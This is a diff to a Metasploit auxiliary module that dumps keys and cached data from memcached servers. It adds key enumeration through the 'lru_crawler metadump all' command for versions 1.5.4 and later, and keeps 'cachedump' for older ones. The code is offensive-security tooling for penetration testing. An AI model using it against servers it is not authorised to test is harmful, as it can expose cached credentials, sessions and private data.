@@ -81,6 +81,20 @@ class MetasploitModule < Msf::Auxiliary
     slab_ids.uniq! || []
   end
 
+  def enumerate_keys_lru
+    keys = []
+    sock.send("lru_crawler metadump all\r\n", 0)
+    loop do
+      data = sock.recv(4096)
+      break if !data || data.length == 0
+      matches = data.scan(/^key=(?<key>.*) exp=/)
+      keys = keys + matches.flatten! if matches
+      break if data =~ /^END/
+      data = ''
+    end
+    keys
+  end
+
   def data_for_keys(keys = [])
     all_data = {}
     keys.each do |key|
@@ -114,6 +128,12 @@ class MetasploitModule < Msf::Auxiliary
       connect
       if (version = determine_version)
         vprint_good("Connected to memcached version #{version}")
+        if (Gem::Version.new(version) >= Gem::Version.new('1.5.4'))
+          command_string = "lru_crawler"
+        else
+          command_string = 'cachedump'
+        end
+        vprint_status("Using #{command_string} to enumerate keys")
         unless localhost?(ip)
           report_service(
             host: ip,
@@ -127,7 +147,11 @@ class MetasploitModule < Msf::Auxiliary
         print_error("unable to determine memcached protocol version")
         return
       end
-      keys = enumerate_keys
+      if(command_string=='cachedump')
+        keys = enumerate_keys
+      else
+        keys = enumerate_keys_lru
+      end
       print_good("Found #{keys.size} keys")
       return if keys.size == 0
 
